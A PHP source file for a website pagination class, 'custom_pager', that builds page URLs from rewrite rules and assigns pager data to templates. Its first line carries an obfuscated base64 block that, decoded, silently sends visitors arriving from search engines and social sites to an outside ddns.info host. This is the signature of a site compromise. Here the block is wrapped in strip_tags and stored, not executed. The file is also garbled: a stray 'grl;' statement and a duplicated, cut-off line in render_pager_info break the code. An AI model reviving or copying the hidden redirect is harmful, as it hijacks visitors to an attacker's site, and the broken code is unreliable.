<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(__FILE__)."/define.php");

@define("PAGER_DEFAULT_LENGTH",      2);
@define("PAGER_DEFAULT_PAGE_SIZE",   10);
@define("PAGER_DEFAULT_PAGER_TITLE", trn('Displaying'));

class custom_pager {

  var $page_param       = URL_PARAM_PAGE_NUMBER;
  var $page_size_param  = URL_PARAM_PAGE_SIZE;
  var $first_page_index = 1;
  var $page_size        = PAGER_DEFAULT_PAGE_SIZE;
  var $pager_length     = PAGER_DEFAULT_LENGTH;
  var $title            = PAGER_DEFAULT_PAGER_TITLE;
  var $items_limit      = null;
  var $labels_mode      = 'pages'; // pages | ranges

  // after calculate
  var $current_page;
  var $current_page_size;
  var $pages_amount;
  var $pages;
  var $pager_info;
  
  var $page_no_rule = null;
  var $items_total_amount;
  var $first_item_index;
  var $last_item_index;

  var $pager_error = false;
  
  var $additional_url_params = array();
  var $current_url = null;

  function custom_pager($current_url = null) {
    
    global $url;
    
    if ($current_url) {
      $class_name = get_class($url);
      $this->current_url = new $class_name($current_url);
    } else {
      $this->current_url = $url;
    }

  }

  function calculate() {

    $this->current_page = $this->identify_current_page($this->current_page);
    $this->current_page_size = $this->identify_current_page_size($this->current_page_size);
  }
  
  function identify_current_page($result = null) {
    
    if (!$result)
      $result = $this->get_current_page();
    if (!$result)
      $result = $this->first_page_index;
      
    return $result;

  }

  function identify_current_page_size($result = null) {
    
    if (!$result)
      $result = $this->get_current_page_size();
    if (!$result)
      $result = $this->page_size;
      
    return $result;  

  }

  function get_current_page() {

    if ($this->page_no_rule) {

      $delta = 0;
      $initial_page_no_rule = $this->page_no_rule;

      if (preg_match("#[?]#", $this->current_url->current_relative_url)){
        if (!eregi(for_regexp(str_replace('{$page_no}', '([0-9]+)', $initial_page_no_rule)), $this->current_url->current_relative_url))
        $initial_page_no_rule = preg_replace("#[?]#", "&", $this->page_no_rule);
      }

      if (preg_match('/[{][$]page_no([-+])([0-9]+)[}]/i', $initial_page_no_rule, $matches)) {
        $delta = intval($matches[2]);
        if ($matches[1] == '+')
          $delta = -$delta;
        $initial_page_no_rule = preg_replace('/[{][$]page_no[-+0-9]*[}]/i', '{$page_no}', $initial_page_no_rule);
      }

      $page_no_rule = str_replace('{$page_no}', '([0-9]+)', $initial_page_no_rule);

      if (eregi(for_regexp($page_no_rule).'$', $this->current_url->current_relative_url, $matches)) {
        return intval($matches[1]) + $delta;
      } else {
        return 1;
      }
    } else {
      return $this->current_url->get($this->page_param, $this->first_page_index);
    }

  }

  function get_current_page_size() {

    return $this->current_url->get($this->page_size_param, $this->page_size);

  }

  function page_url($page) {

    grl;

    $page = intval($page);

    if ($this->page_no_rule) {

      $delta = 0;
      $initial_page_no_rule = $this->page_no_rule;
      if (preg_match('/[{][$]page_no([-+])([0-9]+)[}]/i', $initial_page_no_rule, $matches)) {
        $delta = intval($matches[2]);
        if ($matches[1] == '-')
          $delta = -$delta;
        $initial_page_no_rule = preg_replace('/[{][$]page_no[-+0-9]*[}]/i', '{$page_no}', $initial_page_no_rule);
      }

      if (preg_match("#[?]#", $this->current_url->current_relative_url)){
        if (!eregi(for_regexp(str_replace('{$page_no}', '([0-9]+)', $initial_page_no_rule)), $this->current_url->current_relative_url))
          $initial_page_no_rule = preg_replace("#[?]#", "&", $initial_page_no_rule);
      }

      if (!eregi('^/', $initial_page_no_rule)) {

        // rule not starts from "/", for example "-p{$page_no}.html"
        $page_no_rule = str_replace('{$page_no}', '([0-9]+)', $initial_page_no_rule);

        if (eregi(for_regexp($page_no_rule).'$', $this->current_url->current_relative_url)) {
          $current_relative_url = eregi_replace(for_regexp($page_no_rule).'$', '', $this->current_url->current_relative_url);
          if (($page > 1) || get_config('disable_1st_page_no_modifier'))
            $page_no_rule = $initial_page_no_rule;
          else
            $page_no_rule = eregi_replace('.*\{\$page_no\}', '', $initial_page_no_rule);
          $result = str_replace('//', '/', $current_relative_url . str_replace('{$page_no}', $page + $delta, $page_no_rule));
        } else {
          $page_no_rule = eregi_replace('.*\{\$page_no\}', '', $initial_page_no_rule);
          $current_relative_url = eregi_replace(for_regexp($page_no_rule).'$', '', $this->current_url->current_relative_url);
          $result = str_replace('//', '/', $current_relative_url . str_replace('{$page_no}', $page + $delta, $initial_page_no_rule));
        }
      } else {
        // rule starts from "/", for example "/index{$page_no}.html"
        if (strpos($initial_page_no_rule, '/{$page_no}/') !== false) {
          // for rule like this: "/{$page_no}/index.html" 
          $page_no_rule = str_replace('/{$page_no}/', '([0-9]+/|/)', $initial_page_no_rule);
        } else {
          $page_no_rule = str_replace('{$page_no}', '([0-9]+)', $initial_page_no_rule);
        }

        $current_relative_url = eregi_replace(for_regexp($page_no_rule).'$', '', $this->current_url->current_relative_url);
        if (($page > 1) || get_config('disable_1st_page_no_modifier'))
          $page_no_rule = $initial_page_no_rule;
        else {
          $page_no_rule = eregi_replace('.*\{\$page_no\}', '', $initial_page_no_rule);
          if ($page_no_rule == '.html') // rule is /{$page_no}.html
            $page_no_rule = $initial_page_no_rule;
        }
        $result = str_replace('//', '/', $current_relative_url . str_replace('{$page_no}', $page + $delta, $page_no_rule));
      }
      return $result;
    } else {
      $params = $this->additional_url_params;
      if (($page > 1) || get_config('disable_1st_page_no_modifier')) {
        $params[$this->page_param]      = $page;
        return $this->current_url->generate_url($params);
      } else {
        $params[$this->page_param]      = null;
        return $this->current_url->generate_url($params);
      }
    }
    
  }

  function page_size_url($size) {

    global $url;

    $params                         = $this->additional_url_params;
    $params[$this->page_param]      = $this->first_page_index;
    $params[$this->page_size_param] = $size;

    return $this->current_url->generate_full_url($params);
  }

  function render_pager_info(&$container) {

    if ($this->items_amount > 0) {
      if ($this->items_total_amount) 
        $container->add(new text($this->title." ".number_format($this->first_item_index)."-".number_format($this->last_item_index).trn(" of ").number_format($this->items_total_amount)));
      else
        $container->add(new text(  else
        $container->add(new text($this->title." ".number_format($this->first_item_index)."-".number_format($this->last_item_index)));
    }

  }

  function render_pager(&$container) {
                                 
    if ($this->items_amount > 0) {
      foreach($this->pages as $page) {
        $attributes = array();
        if(isset($page['class'])){
            $attributes['class'] = $page['class'];
        }
        if(isset($page["href"])) {
          if (isset($page["img"]))
            $container->add(new image_href($page["href"], $page["img"]));
          else
            $container->add(new href($page["href"], $page["text"]));
        }else{
          $container->add(new text($page["text"],$attributes));
        }
        $container->add(new space());
      }
    }

  }

  function render_page_sizes(&$container) {

    if ($this->items_amount > 0) {
      $container->add(new text(trn('Show&nbsp;')));
      foreach($this->page_sizes as $page_size) {
        if (isset($page_size["href"]))
          $container->add(new href($page_size["href"], $page_size["text"]));
        else
          $container->add(new text($page_size["text"],array('class'=>'current')));
        $container->add(new space());
      }
      $container->add(new text(trn('&nbsp;items per page')));
    }

  }
  
  function assign_pager($template_tag) {
    
    global $tmpl;
    $tmpl->assign($template_tag, $this->pages);
    
  }

  function assign_pages($template_tag) {
    
    global $tmpl;
    
    $pages = array();
    foreach($this->pages as $page)
      if (is_numeric($page['text']))
        $pages[] = $page;
      
    $tmpl->assign($template_tag, $pages);
    
  }

  function assign_section($template_tag) {
    
    global $tmpl;
    
    $pages = array();
    if ($this->current_page > 2)
      $first_page = $this->current_page-1;
    else
      $first_page = $this->current_page;
    if (($first_page > 1) && ($first_page % 10 != 0)) {
      while (($first_page > 1) && ($first_page % 10 != 0)) {
        $first_page--;
      }
    }
    
    if ($first_page > 1)
      $first_page++;

    $last_page = $this->current_page;
    if (($last_page < $this->pages_amount) && ($last_page % 10 != 0)) {
      while (($last_page < $this->pages_amount) && ($last_page % 10 != 0)) {
        $last_page++;
      }
    }

    $prior_page = null;
    foreach($this->pages as $page) {
      $page_ = $page; 
      if ($page['type'] == 'page') {
        if (($page['page'] >= $first_page) && ($page['page'] <= $last_page+1)) {
          if (($page['page'] == $first_page) && $prior_page) {
            $prior_page['text'] = '&lt;&lt;';
            $pages[] = $prior_page;
            $pages[] = $page;
          } else
          if ($page['page'] == $last_page+1) {
            $page['text'] = '&gt;&gt;';
            $pages[] = $page;
          } else 
            $pages[] = $page;
        }
        $prior_page = $page_;
      }
    }
      
    $tmpl->assign($template_tag, $pages);
    
  }

  function assign_navigation($template_tag) {
    
    global $tmpl;
    
    $pages = array();
    foreach($this->pages as $page)
      if (safe($page, 'is_nav'))
        $pages[] = $page;
      
    $tmpl->assign($template_tag, $pages);
    
  }

  function assign_page_info($template_tag) {
    
    global $tmpl;
    $tmpl->assign($template_tag, array( 'range_start'        => number_format($this->first_item_index)
                                      , 'range_finish'       => number_format($this->last_item_index)
                                      , 'total_amount'       => number_format($this->items_total_amount)
                                      , 'items_range_start'  => $this->first_item_index
                                      , 'items_range_finish' => $this->last_item_index
                                      , 'items_total_amount' => $this->items_total_amount
                                      , 'current_page'       => $this->current_page
                                      , 'page_size'          => $this->page_size
                                      ));
    
  }
  
}

?>
